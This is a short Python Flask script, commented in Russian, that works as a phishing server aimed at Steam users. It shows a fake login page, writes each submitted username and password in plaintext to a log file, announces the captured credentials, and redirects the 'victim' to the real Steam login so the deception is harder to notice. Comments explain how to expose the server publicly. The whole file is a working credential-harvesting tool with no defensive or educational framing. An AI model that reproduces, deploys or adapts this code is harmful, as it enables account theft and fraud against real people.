from flask import Flask, request, render_template, redirect
import datetime

app = Flask(__name__)

# Маршрут для отображения страницы входа
@app.route('/login', methods=['GET'])
def show_login_page():
    return render_template('login.html')

# Маршрут для обработки отправленных учетных данных
@app.route('/submit_credentials', methods=['POST'])
def handle_credentials():
    try:
        username = request.form.get('username')
        password = request.form.get('password')

        if username and password:
            timestamp = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
            log_entry = f"[{timestamp}] Username: {username}, Password: {password}\n"

            with open('steam_logs.txt', 'a', encoding='utf-8') as f:
                f.write(log_entry)
            print(f"[*] Credentials captured: {username}:{password}")

            # После успешного захвата данных, перенаправляем жертву на настоящую страницу Steam
            # или на страницу с сообщением об ошибке для убедительности.
            # Здесь перенаправляем на главную страницу Steam.
            return redirect("https://store.steampowered.com/login/", code=302)
        else:
            print("[!] Received incomplete credentials.")
            return "Missing username or password", 400
    except Exception as e:
        print(f"[!] Error processing credentials: {e}")
        return "Internal Server Error", 500

# Запуск сервера
if __name__ == '__main__':
    # Запускаем на всех доступных интерфейсах (0.0.0.0) на порту 5000.
    # Для внешнего доступа тебе нужно будет настроить проброс портов или использовать публичный IP.
    app.run(host='0.0.0.0', port=5000)
